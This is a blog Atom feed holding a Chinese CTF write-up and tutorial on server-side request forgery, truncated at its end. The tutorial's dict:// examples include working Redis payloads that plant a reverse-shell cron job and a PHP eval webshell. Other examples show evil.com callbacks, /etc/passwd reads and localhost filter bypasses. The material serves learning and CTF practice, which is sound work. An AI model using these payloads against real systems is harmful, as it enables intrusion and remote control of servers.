<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-23T05:04:55.663Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSRF</title>
    <link href="http://example.com/2024/04/22/SSRF/"/>
    <id>http://example.com/2024/04/22/SSRF/</id>
    <published>2024-04-22T13:56:10.000Z</published>
    <updated>2024-04-23T05:04:55.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1><h2 id="dasctf-x-gfctf-2024-easysignin"><a class="markdownIt-Anchor" href="#dasctf-x-gfctf-2024-easysignin">#</a> DASCTF X GFCTF 2024 | EasySignin</h2><p>首先复现一道最近比赛遇到的一道题</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/IWw2RAmLtjMisFH.png" alt="image.png"></p><p>经典登陆界面开局，先尝试 admin 123456，密码错误，注册一个 admin1 123456，登上去之后看好康的照片，不给看，权限不够，应该还是需要登录 admin，发现有一个更改密码的选项，可以利用一下</p><p>这里有两种方式：</p><p>1. 利用 sql 注入</p><p>注册时用户名为 <code>admin&quot;#</code> 双引号会闭合前面的引号，# 注释掉后面的内容，此时登录之后更改密码实际会更改 <code>admin</code>  的密码，在登陆 admin 就可以看了</p><p>2.burp 抓包</p><p>修改密码利用 bp 抓包</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/RuP9V7keCf3Kb8Y.png" alt="image.png"></p><p>发现会显示 username，且这里未验证 session 中的 username 和输入的 username 是否相同，那这里就存在逻辑漏洞了，可以尝试将 username 赋值为 admin，即可以越权修改 admin 的密码，修改密码后以 admin 密码登录。</p><p>登录到 admin 之后查看好康的照片</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/22/1YukL6P4.png" alt="1713795160605.png"></p><p>发现直接显示了文件的地址，下面就要用到 SSRF 的知识了，测试一下，过滤掉了 file、dict 等几个协议，但没过滤 gopher，可以用它探测服务和端口，探测到 3306 端口开放了 mysql 服务，这里 root 的密码为空，于是我们可以利用 gopher 协议去攻击 mysql。</p><p>直接利用 Gopherus 查看根目录下的 flag 文件</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/Fpa2BKjsRrZeNw8.png" alt="image.png"></p><p>二次 url 编码，bp 抓包</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/DNrAxPlFmZ58GHu.png" alt="image.png"></p><p>base64 解码得到 flag： <code>DASCTF&#123;39302405-b602-4b99-8101-66cd65424bbe&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/kgFEKOrs6Q7NxWP.png" alt="image.png"></p><h2 id="ssrf-2"><a class="markdownIt-Anchor" href="#ssrf-2">#</a> SSRF</h2><h3 id="ssrf是什么"><a class="markdownIt-Anchor" href="#ssrf是什么">#</a> SSRF 是什么？</h3><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由<strong>服务端</strong>发起请求的一个安全漏洞。</p><p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p><p>一般情况下，SSRF 攻击的目标是<strong>从外网无法访问的内部系统</strong>。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>比如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf 是利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器</p><h3 id="ssrf与csrf的区别"><a class="markdownIt-Anchor" href="#ssrf与csrf的区别">#</a> SSRF 与 CSRF 的区别</h3><p>​    CSRF 是服务器端没有对用户提交的数据进行随机值校验，且对 http 请求包内的 refer 字段校验不严，导致攻击者可以利用用户的 cookie 信息伪造用户请求发送至服务器；</p><p>​    SSRF 是服务器对用户提供的可控 URL 过于信任，没有对攻击者提供的 URL 进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p><h3 id="ssrf中url的伪协议"><a class="markdownIt-Anchor" href="#ssrf中url的伪协议">#</a> SSRF 中 URL 的伪协议</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如:file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如:dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure></div><h4 id="1-file"><a class="markdownIt-Anchor" href="#1-file">#</a> 1、file</h4><p>这种 URL Schema 可以尝试从系统文件中获取文件</p><p><code>file://文件的绝对路径</code></p><blockquote><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p></blockquote><h4 id="2-dict"><a class="markdownIt-Anchor" href="#2-dict">#</a> 2、dict</h4><p>dict 协议一般常用来探测内网主机以及端口开放情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息。当然 dict 协议也可以用来执行一些服务的命令，如 redis</p><ul><li>内网主机探测</li><li>开放端口探测</li><li>端口服务指纹探测</li><li>执行命令</li></ul><p><code>ditc://ip:port</code></p><p><code>ditc://ip:port/命令</code></p><p>这种 URL Scheme 能够引用允许通过 DICT 协议使用的定义或单词列表：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></div><h4 id="3-sftp"><a class="markdownIt-Anchor" href="#3-sftp">#</a> 3、sftp</h4><p>在这里，Sftp 代表 SSH 文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与 SSH 打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">一、dict协议探测端口和服务指纹</span><br><span class="line">dict://127.0.0.1:22</span><br><span class="line">dict://172.22.10.10:3306</span><br><span class="line">dict://127.0.0.1:6379/info</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">二、dict协议攻击redis，写入定时任务，进行反弹shell</span><br><span class="line">centos系统定时任务的路径为：/var/spool/cron</span><br><span class="line">debian系统定时任务的路径为：/var/spool/cron/crontabs</span><br><span class="line"> </span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">注意：若payload存在被转义或过滤的情况，可利用16进制写入内容</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">三、dict协议攻击redis，写入webshell</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:test.php</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/www/html</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">若存在过滤， 则利用16进制内容写入：</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">四、dict协议攻击redis，写入ssh公钥</span><br><span class="line">操作和写入定时任务相似</span><br></pre></td></tr></table></figure></div><h4 id="4-gopher协议"><a class="markdownIt-Anchor" href="#4-gopher协议">#</a> 4、gopher 协议</h4><p>上面官方的说明了一下 gopher 协议介绍，具体如何在 ssrf 中使用呢？</p><p>gopher 协议在 ssrf 的利用中一般用来攻击 redis，mysql，fastcgi，smtp 等服务。</p><p>gopher 协议数据格式：</p><p><code>gopher://ip:port/_TCP/IP数据流</code></p><p>注意：</p><blockquote><p>1.gopher 协议数据流中，url 编码使用 %0d%0a 替换字符串中的回车换行<br> 2. 数据流末尾使用 %0d%0a 代表消息结束</p></blockquote><h4 id="5-ldap或ldaps-或ldapi"><a class="markdownIt-Anchor" href="#5-ldap或ldaps-或ldapi">#</a> 5、ldap:// 或 ldaps:// 或 ldapi://</h4><p>LDAP 代表轻量级目录访问协议。它是 IP 网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></div><h4 id="6-tftp"><a class="markdownIt-Anchor" href="#6-tftp">#</a> 6、tftp://</h4><p>TFTP（Trivial File Transfer Protocol, 简单文件传输协议）是一种简单的基于 lockstep 机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></div><h3 id="探测内网"><a class="markdownIt-Anchor" href="#探测内网">#</a> 探测内网</h3><p>ssrf 最常见的就是探测内网，如果找到了内网 IP 的网段，可以尝试用暴力破解去探测内网的 IP，下面给出几种常见的探测方法。</p><ul><li>脚本</li></ul><p>这里贴一个通用的 python 脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ports = [<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;6379&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>]</span><br><span class="line">session = requests.Session();</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line"> ip = <span class="string">&#x27;192.168.0.%d&#x27;</span> % i <span class="comment">#内网ip地址</span></span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">  url = <span class="string">&#x27;http://ip/?url=http://%s:%s&#x27;</span> %(ip,port)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">   res = session.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span> :    <span class="comment">#这里长度根据实际情况改</span></span><br><span class="line">    <span class="built_in">print</span>(ip,port,<span class="string">&#x27;is open&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>这里写的是爆破指定的一些端口和 IP 的 D 段，注意的是有些题目会给出端口的范围，就可以把 ports 改为 <code>range()</code>  指定为一定的范围，然后返回的长度 <code>len(res.text)</code>  要先自己测一下。</p><ul><li>burpsuite</li></ul><p>可以选择用 burpsuite 软件中 Intruder 去爆破</p><ul><li>nmap 工具</li></ul><p>扫描目标开放端口，直接用 nmap 一把梭。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV ip</span><br><span class="line">nmap -sV ip -p6379 //指定6379端口扫描</span><br></pre></td></tr></table></figure></div><h3 id="bypass"><a class="markdownIt-Anchor" href="#bypass">#</a> Bypass</h3><p>经常会有题目 ban 掉 127.0.0.1 这个网址，需要进行绕过</p><h4 id="xipio"><a class="markdownIt-Anchor" href="#xipio">#</a> <a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>有一个网站地址是：<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问： <code>http://127.0.0.1.xip.io/1.php</code> ，实际上访问的是 <code>http://127.0.0.1/1.php</code> 。</p><p><a class="link" href="http://xn--nip-ve1en80a0uy063a0hj9o1bga.io">像这种网址还有 nip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link" href="http://sslip.io">sslip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>如果 php 后端只是用 parse_url 函数中的 host 参数判断是否等于 127.0.0.1，就可以用这种方法绕过，但是如果是检查是否存在关键字 127.0.0.1，这种方法就不可行了</p><h4 id="短地址绕过"><a class="markdownIt-Anchor" href="#短地址绕过">#</a> 短地址绕过</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/Pjbm4EWVKTFqkgp.png" alt="image.png"></p><p>此时直接用 <code>http://z6b.cn/yPqiU</code>  就会 302 跳转绕过 WAF</p><h4 id="进制转换"><a class="markdownIt-Anchor" href="#进制转换">#</a> 进制转换</h4><p>可以使用一些不同的进制替代 ip 地址，从而绕过 WAF，</p><p>贴一个进制转换的 php 脚本</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>注意八进制 ip 前要加上一个 0，其中八进制前面的 0 可以为多个，十六进制前要加上一个 0x。</p><p>127.0.0.1：</p><blockquote><p>八进制：0177.0.0.1</p><p>十六进制：0x7f.0.0.1</p><p>十进制：2130706433</p></blockquote><h4 id="利用dns解析"><a class="markdownIt-Anchor" href="#利用dns解析">#</a> 利用 DNS 解析</h4><p>如果你自己有域名的话，可以在域名上设置 A 记录，指向 127.0.0.1。</p><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> @绕过</h4><p><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code> ，在对 @解析域名中，不同的处理函数存在处理差异<br>在 PHP 的 parse_url 中会识别 <code>www.ccc.com</code> ，而 libcurl 则识别为 <code>www.bbb.com</code> 。</p><h4 id="其他各种指向127001的地址"><a class="markdownIt-Anchor" href="#其他各种指向127001的地址">#</a> 其他各种指向 127.0.0.1 的地址</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ #localhost就是127.0.0.1</span><br><span class="line">http://0/ #0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/ #linux可用</span><br><span class="line">http://[::]:80/ #linux可用</span><br><span class="line">http://127。0。0。1/ #句号会被解析成.</span><br><span class="line">http://①②⑦.⓪.⓪.① #Enclosed alphanumerics方法绕过</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ #第7.8行中0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure></div><h4 id="常见限制"><a class="markdownIt-Anchor" href="#常见限制">#</a> 常见限制</h4><p>1. 限制为 <code>http://www.xxx.com </code> 域名</p><p>采用 http 基本身份认证的方式绕过，即 @<br> <code>http://www.xxx.com@www.xxc.com</code></p><p>2. 限制请求 IP 不为内网地址</p><p>当不允许 ip 为内网地址时：</p><blockquote><p>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>3. 限制请求只为 http 协议</p><blockquote><p>（1）采取 302 跳转（<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）<br>（2）采取短地址</p></blockquote><h3 id="不存在的协议头绕过"><a class="markdownIt-Anchor" href="#不存在的协议头绕过">#</a> 不存在的协议头绕过</h3><p>有关 <code>file_get_contents()</code>  函数的一个 trick，可以看作是 SSRF 的一个黑魔法，当 PHP 的  <code>file_get_contents()</code>  函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。</p><p>例子：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>限制只读 https 开头的路径，可以构造： <code>httpssss://</code></p><p>配合目录回读：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://../../../../../../etc/passwd</span><br><span class="line">httpsssss://abc../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">httpsssss://../../../../../../flag</span><br></pre></td></tr></table></figure></div><p>可以得到一些敏感信息</p><h3 id="url的解析问题"><a class="markdownIt-Anchor" href="#url的解析问题">#</a> URL 的解析问题</h3><ul><li>利用 readfile 和 parse_url 解析差异</li></ul><p>贴一个极客大挑战的题</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>可以看到 check_inner_ip 通过 url_parse 检测是否为内网 ip，如果满足不是内网 ip ，通过 curl 请求 url 返回结果，这题就可以利用 curl 和 parse_url 解析的差异不同来绕过，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p><p>最后的 payload 